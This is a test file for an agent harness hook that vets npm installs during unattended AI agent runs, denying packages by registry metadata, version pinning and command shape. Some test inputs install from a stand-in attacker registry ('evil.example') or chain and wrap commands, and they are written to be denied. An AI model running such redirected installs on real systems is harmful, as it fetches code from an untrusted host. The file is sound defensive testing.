// agent-harness → "Dependency installs are vetted automatically in unattended mode"
// (openspec change autonomous-run-switch, design D3).
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { bashInput, createProject, runHook, type Project } from './support/run-hook';
import { startRegistry, type Registry, type StubPackage } from './support/stubs';

const DAY = 86_400_000;
const ago = (days: number) => new Date(Date.now() - days * DAY).toISOString();
const good = (extra: Partial<StubPackage> = {}): StubPackage => ({
  created: ago(730),
  repository: { type: 'git', url: 'git+https://github.com/x/y.git' },
  versions: { '1.3.0': { published: ago(365) }, '1.0.0-rc.1': { published: ago(400) } },
  weeklyDownloads: 2_000_000,
  ...extra,
});

describe('Dependency installs are vetted automatically in unattended mode', { timeout: 120_000 }, () => {
  let registry: Registry;
  let slow: Registry;
  let project: Project | undefined;

  beforeAll(async () => {
    const packages: Record<string, StubPackage> = {
      'left-pad': good(),
      '@scope/pkg': good({ versions: { '1.0.0': { published: ago(300) } } }),
      'pre-pkg': good(),
      young: good({ created: ago(10), versions: { '1.0.0': { published: ago(10) } } }),
      'fresh-version': good({ versions: { '2.0.0': { published: ago(2) } } }),
      unpopular: good({ weeklyDownloads: 500 }),
      norepo: good({ repository: undefined }),
      scripted: good({ versions: { '1.0.0': { published: ago(300), scripts: { postinstall: 'node x.js' } } } }),
    };
    registry = await startRegistry(packages);
    slow = await startRegistry({ 'left-pad': good() }, 9_000);
  });
  afterAll(async () => {
    await registry.close();
    await slow.close();
  });
  afterEach(() => project?.cleanup());

  const env = (r: Registry) => ({ KIT_NPM_REGISTRY: r.registryUrl, KIT_NPM_DOWNLOADS: r.downloadsUrl });
  const unattended = () => createProject({ env: { KIT_AUTONOMOUS_RUN: '1' } });
  const vet = (p: Project, command: string, r: Registry = registry) =>
    runHook(p, 'block-dangerous-bash', bashInput(command), { env: env(r) });

  it('A vetted package is allowed', async () => {
    project = unattended();
    for (const command of ['npm install --save-dev left-pad@1.3.0', 'npm i left-pad@1.3.0 2>&1']) {
      const r = await vet(project, command);
      expect(r.decision, `${command} ${r.reason}`).toBe('allow');
    }
  });

  it('Flags before the package name do not skip the check', async () => {
    project = unattended();
    const r = await vet(project, 'npm i -D unknown-pkg-zz@1.0.0');
    expect(r.decision).toBe('deny');
    expect(r.reason).toContain('does not exist');
  });

  it('A chained or redirected-registry install is denied', async () => {
    project = unattended();
    for (const command of [
      'npm i left-pad@1.3.0 && git add -A',
      'npm i left-pad@1.3.0 --registry https://evil.example',
      'npm_config_registry=https://evil.example npm i left-pad@1.3.0',
      'bash -c "npm i left-pad@1.3.0"',
    ]) {
      expect((await vet(project, command)).decision, command).toBe('deny');
    }
  });

  it('Installs without a package name are not recognised', async () => {
    for (const autonomous of ['0', '1']) {
      project = createProject({ env: { KIT_AUTONOMOUS_RUN: autonomous } });
      for (const command of ['npm ci', 'npm install --omit dev', 'pip install -r requirements.txt']) {
        expect((await vet(project, command)).decision, `${autonomous} ${command}`).toBe('none');
      }
      project.cleanup();
      project = undefined;
    }
  });

  it('Outside unattended mode a recognised install asks', async () => {
    project = createProject({ env: { KIT_AUTONOMOUS_RUN: '0' } });
    for (const command of ['pnpm add -D left-pad@1.3.0', 'npm i -D x@1.0.0']) {
      expect((await vet(project, command)).decision, command).toBe('ask');
    }
  });

  it('A package without an exact version is denied', async () => {
    project = unattended();
    for (const command of ['npm install left-pad', 'npm install left-pad@^1.3.0', 'npm install left-pad@1.3']) {
      const r = await vet(project, command);
      expect(r.decision, command).toBe('deny');
      expect(r.reason).toContain('<name>@<exact version>');
    }
  });

  it('A package that fails a check is denied naming the check', async () => {
    project = unattended();
    const cases: Array<[string, string]> = [
      ['npm i nope-zz@1.0.0', 'does not exist'],
      ['npm i left-pad@9.9.9', 'version 9.9.9 does not exist'],
      ['npm i young@1.0.0', 'first published 10 days ago'],
      ['npm i fresh-version@2.0.0', 'published 2 days ago'],
      ['npm i unpopular@1.0.0', '500 downloads'],
      ['npm i norepo@1.3.0', 'no repository'],
      ['npm i scripted@1.0.0', 'postinstall'],
      ['npm i left-pad@1.3.0 young@1.0.0', 'young'],
    ];
    for (const [command, expected] of cases) {
      const r = await vet(project, command);
      expect(r.decision, command).toBe('deny');
      expect(r.reason, command).toContain(expected);
    }
    for (const command of ['npm i @scope/pkg@1.0.0', 'npm i pre-pkg@1.0.0-rc.1']) {
      const r = await vet(project, command);
      expect(r.decision, `${command} ${r.reason}`).toBe('allow');
    }
  });

  it('An unreachable or slow registry denies', async () => {
    project = unattended();
    const closed = { registryUrl: 'http://127.0.0.1:9/registry', downloadsUrl: 'http://127.0.0.1:9/downloads', close: async () => {} };
    expect((await vet(project, 'npm i left-pad@1.3.0', closed)).decision).toBe('deny');
    expect((await vet(project, 'npm i left-pad@1.3.0', slow)).decision).toBe('deny');
  });

  it('Other package managers and package runners are denied', async () => {
    project = unattended();
    for (const command of ['pip install requests==2.32.3', 'npx cowsay@1.6.0', 'npx -p x y', 'npx not-installed-bin', 'pnpm dlx x', 'bunx x']) {
      expect((await vet(project, command)).decision, command).toBe('deny');
    }
  });

  it('A locally installed binary runs', async () => {
    project = unattended();
    project.write('node_modules/.bin/vitest', '');
    expect((await vet(project, 'npx vitest run tests/harness')).decision).toBe('none');
  });
});
